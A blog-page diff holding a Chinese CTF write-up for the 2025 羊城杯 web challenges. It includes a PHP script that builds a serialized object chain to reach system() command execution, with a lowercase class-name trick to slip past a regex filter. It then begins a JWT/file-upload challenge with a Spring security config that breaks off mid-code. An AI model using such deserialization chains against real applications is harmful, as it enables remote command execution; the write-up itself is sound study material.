@@ -1,0 +1,950 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="exp3n5ive">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set data attribute for CSS variables
+                root.setAttribute("data-theme", theme);
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes once DOM is ready
+            if (document.readyState !== "loading") {
+                document.body.classList.add(theme + "-mode");
+            } else {
+                document.addEventListener("DOMContentLoaded", () => {
+                    document.body.classList.add(theme + "-mode");
+                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
+                });
+            }
+        })();
+    </script>
+    
+    <!-- Critical CSS to prevent flash -->
+    <style>
+        :root[data-theme="dark"] {
+            --background-color: #202124;
+            --background-color-transparent: rgba(32, 33, 36, 0.6);
+            --second-background-color: #2d2e32;
+            --third-background-color: #34353a;
+            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #ffffff;
+            --second-text-color: #eeeeee;
+            --third-text-color: #bebec6;
+            --fourth-text-color: #999999;
+            --default-text-color: #bebec6;
+            --invert-text-color: #373D3F;
+            --border-color: rgba(255, 255, 255, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(255, 255, 255, 0.08);
+            --shadow-color-2: rgba(255, 255, 255, 0.05);
+        }
+        
+        :root[data-theme="light"] {
+            --background-color: #fff;
+            --background-color-transparent: rgba(255, 255, 255, 0.6);
+            --second-background-color: #f8f8f8;
+            --third-background-color: #f2f2f2;
+            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #16171a;
+            --second-text-color: #2f3037;
+            --third-text-color: #5e5e5e;
+            --fourth-text-color: #eeeeee;
+            --default-text-color: #373D3F;
+            --invert-text-color: #bebec6;
+            --border-color: rgba(0, 0, 0, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(0, 0, 0, 0.08);
+            --shadow-color-2: rgba(0, 0, 0, 0.05);
+        }
+        
+        body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+        
+        /* Apply body classes as soon as DOM is ready */
+        :root[data-theme="dark"] body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+    </style>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2025/10/13/羊城杯-2025/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="ez_unserialize小写绕正则即可 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2025-羊城杯-Web">
+<meta property="og:url" content="http://example.com/2025/10/13/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2025/index.html">
+<meta property="og:site_name" content="exp3n5ive&#39; Blog">
+<meta property="og:description" content="ez_unserialize小写绕正则即可 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/redefine-og.webp">
+<meta property="article:published_time" content="2025-10-13T09:33:43.920Z">
+<meta property="article:modified_time" content="2025-10-13T09:35:12.589Z">
+<meta property="article:author" content="exp3n5ive">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/bemd.ico" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/bemd.ico">
+    <meta name="theme-color" content="#9EC4CC">
+    <link rel="shortcut icon" href="/images/bemd.ico">
+    <!--- Page Info-->
+    
+    <title>
+        
+            2025-羊城杯-Web | exp3n5ive&#39; Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":6,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#9EC4CC","secondary":"#9EC4CC","default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":null},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":".","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"categories":{"path":"/categories/","icon":"fa-solid fa-layer-group"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"YYYY-MM-DD HH:mm:ss","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                exp3n5ive&#39; Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories/"
+                                        >
+                                    <i class="fa-solid fa-layer-group fa-fw"></i>
+                                    CATEGORIES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories/"
+                        >
+                            <span>
+                                CATEGORIES
+                            </span>
+                            
+                                <i class="fa-solid fa-layer-group fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">5</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">2025-羊城杯-Web</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/bemd.jpeg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">exp3n5ive</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-10-13 17:33:43</span>
+        <span class="mobile">2025-10-13 17:33:43</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-10-13 17:35:12</span>
+            <span class="mobile">2025-10-13 17:35:12</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/CTF/">CTF</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/CTF/WriteUp/">WriteUp</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>1.2k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>6 Mins</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h1 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize"></a>ez_unserialize</h1><p>小写绕正则即可</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$first</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$step</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$next</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="comment">//        $this-&gt;first = &quot;继续加油！&quot;;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// toString</span></span><br><span class="line"><span class="comment">//        echo $this-&gt;next;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$you</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$found</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span> = <span class="string">&quot;admin123&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="comment">//        if ($name === &quot;secret&quot;) &#123;</span></span><br><span class="line"><span class="comment">//            echo &quot;&lt;br&gt;&quot; . $name . &quot; maybe is here!&lt;/br&gt;&quot;;</span></span><br><span class="line"><span class="comment">//            // F.check</span></span><br><span class="line"><span class="comment">//            $this-&gt;found-&gt;check();</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">F</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fifth</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$step</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$finalstep</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="comment">//        if (preg_match(&quot;/U/&quot;, $this-&gt;finalstep)) &#123;</span></span><br><span class="line"><span class="comment">//            echo &quot;仔细想想！&quot;;</span></span><br><span class="line"><span class="comment">//        &#125; else &#123;</span></span><br><span class="line"><span class="comment">//            $this-&gt;step = new $this-&gt;finalstep();</span></span><br><span class="line"><span class="comment">//            // invoke</span></span><br><span class="line"><span class="comment">//            ($this-&gt;step)();</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">H</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$who</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$are</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$you</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    public function __construct()</span></span><br><span class="line"><span class="comment">//    &#123;</span></span><br><span class="line"><span class="comment">//        $this-&gt;you = &quot;nobody&quot;;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//    public function __destruct()</span></span><br><span class="line"><span class="comment">//    &#123;</span></span><br><span class="line"><span class="comment">//        // 开始</span></span><br><span class="line"><span class="comment">//        $this-&gt;who-&gt;start();</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">N</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$congratulation</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$yougotit</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    public function __call(string $func_name, array $args)</span></span><br><span class="line"><span class="comment">//    &#123;</span></span><br><span class="line"><span class="comment">//        // sink</span></span><br><span class="line"><span class="comment">//        return call_user_func($func_name, $args[0]);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">U</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$almost</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$there</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    public function __construct()</span></span><br><span class="line"><span class="comment">//    &#123;</span></span><br><span class="line"><span class="comment">//        $this-&gt;there = new N();</span></span><br><span class="line"><span class="comment">//        $this-&gt;cmd = $_POST[&#x27;cmd&#x27;];</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//    public function __invoke()</span></span><br><span class="line"><span class="comment">//    &#123;</span></span><br><span class="line"><span class="comment">//        // call</span></span><br><span class="line"><span class="comment">//        return $this-&gt;there-&gt;system($this-&gt;cmd);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">V</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$good</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$keep</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dowhat</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$go</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    public function __toString()</span></span><br><span class="line"><span class="comment">//    &#123;</span></span><br><span class="line"><span class="comment">//        $abc = $this-&gt;dowhat;</span></span><br><span class="line"><span class="comment">//        // __get</span></span><br><span class="line"><span class="comment">//        $this-&gt;go-&gt;$abc;</span></span><br><span class="line"><span class="comment">//        return &quot;&lt;br&gt;Win!!!&lt;/br&gt;&quot;;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//\H::__destruct</span></span><br><span class="line"><span class="comment">//\A::start</span></span><br><span class="line"><span class="comment">//\V::__toString</span></span><br><span class="line"><span class="comment">//\E::__get</span></span><br><span class="line"><span class="comment">//\F::check</span></span><br><span class="line"><span class="comment">//\U::__invoke</span></span><br><span class="line"><span class="comment">//\N::__call</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$h</span> = <span class="keyword">new</span> <span class="title function_ invoke__">H</span>();</span><br><span class="line"><span class="variable">$h</span> -&gt; who = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$h</span> -&gt; who -&gt; next = <span class="keyword">new</span> <span class="title function_ invoke__">V</span>();</span><br><span class="line"><span class="variable">$h</span> -&gt; who -&gt; next -&gt; dowhat = <span class="string">&quot;secret&quot;</span>;</span><br><span class="line"><span class="variable">$h</span> -&gt; who -&gt; next -&gt; go = <span class="keyword">new</span> <span class="title function_ invoke__">E</span>();</span><br><span class="line"><span class="variable">$h</span> -&gt; who -&gt; next -&gt; go -&gt; found = <span class="keyword">new</span> <span class="title function_ invoke__">F</span>();</span><br><span class="line"><span class="variable">$h</span> -&gt; who -&gt; next -&gt; go -&gt; found -&gt; finalstep = <span class="string">&quot;u&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$h</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://exp3n5ive.github.io/2025/10/13/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2025/images/1760150948809-4973c921-dac1-484d-9308-505a94b94aa1.png"
+                     
+                ></p>
+<h1 id="authweb"><a href="#authweb" class="headerlink" title="authweb"></a>authweb</h1><p>有一个上传文件的接口 :</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://exp3n5ive.github.io/2025/10/13/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2025/images/1760180611199-1ea3ecbe-0693-4e20-b6a8-38ec53e8b064.png"
+                     
+                ></p>
+<p>需要 user 的 jwt 才能上传文件 :</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.config.annotation.web.builders.HttpSecurity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.config.annotation.web.configurers.AuthorizeHttpRequestsConfigurer;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.userdetails.UserDetailsService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.web.SecurityFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecurityConfig</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> JwtTokenProvider 